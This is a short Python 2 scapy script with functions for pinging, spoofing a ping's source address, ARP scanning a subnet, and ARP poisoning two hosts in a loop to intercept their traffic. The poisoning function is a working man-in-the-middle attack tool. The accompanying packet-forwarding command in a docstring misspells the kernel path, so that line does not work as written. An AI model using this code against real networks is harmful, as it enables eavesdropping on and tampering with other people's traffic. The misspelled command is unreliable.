#!/usr/bin/python
from scapy.all import *
from time import sleep
import sys


def ping(dst='10.0.1.100', msg='Hello world'):
    packet = IP(dst=dst)/ICMP()/msg
    print "[*] Pinging host {}".format(dst)
    send(packet)


def ping_spoof_src(dst='10.0.1.100', src='1.1.1.1', msg='Hello world'):
    packet = IP(dst=dst, src=src)/ICMP()/msg
    response, ununswered = sr(packet, timeout=1)

    if response:
        print "[+] {}".format(response[0][0].summary())
        print "[+] {}".format(response[0][1].summary())

        s, r = response[0]
        print "[+] {}".format(s[IP].src)
        print "[+] {}".format(r[IP].src)

    else:
        print "[-] No response received"


def get_mac(ip_address):
    response, unanswered = srp(
        Ether(dst='ff:ff:ff:ff:ff:ff')/
        ARP(pdst=ip_address),
        timeout=1, retry=5, verbose=0
    )

    if response:
        s, r = response[0]
        print "[+] Host {} is at {}".format(r[ARP].psrc, r[Ether].src)
    else:
        print "[-] No response received"


def arp_scan(ip_range):
    print "[*] Scanning range {}".format(ip_range)

    response, unanswered = srp(
        Ether(dst='ff:ff:ff:ff:ff:ff')/
        ARP(pdst=ip_range),
        timeout=1, retry=5, verbose=0
    )

    for ctr in range(0, len(response)):
        s, r = response[ctr]
        move_by = 18 - len(r[ARP].psrc)
        print "[+] {0:} {2:>{3}} {1:^20}".format(
            r[ARP].psrc,
            r[Ether].src,
            "is at", move_by
        )


def arp_poison(target_1_ip, target_1_mac, target_2_ip, target_2_mac):
    """
    Some useful commands in the interactive mode:
    p = ARP()
    p.show()
    p.op = 1 (op = who-has)
    p.op = 2 (op = is-at)
    p.show()
    """
    evil_pkt_1 = ARP()
    evil_pkt_1.op = 2
    evil_pkt_1.psrc = target_1_ip
    evil_pkt_1.pdst = target_2_ip
    evil_pkt_1.hwdst = target_2_mac

    evil_pkt_2 = ARP()
    evil_pkt_2.op = 2
    evil_pkt_2.psrc = target_2_ip
    evil_pkt_2.pdst = target_1_ip
    evil_pkt_2.hwdst = target_1_mac

    print "[*] ARP poisoning hosts {} and {} " \
          "[Ctrl-C to stop]".format(target_1_ip, target_2_ip)

    while True:
        try:
            send(evil_pkt_1, verbose=0)
            send(evil_pkt_2, verbose=0)
            sleep(1)
        except KeyboardInterrupt:
            print "[*] ARP poisoning finished"
            return


if __name__ == '__main__':
    """
    To enable packet forwarding execute in the terminal:
        echo 1 > /proc/sys/net/ipv4/ip_foward
    """
    # ping(dst='10.0.1.121', msg='Cooool...')
    # ping_spoof_src(dst='10.0.1.101', src='10.0.2.15')
    # get_mac('10.0.1.121')
    # arp_scan('10.0.1.0/24')
    # arp_poison('10.0.1.113', '30:e1:71:25:85:b2',
    #           '10.0.0.254', '4c:5e:0c:4b:96:f7')
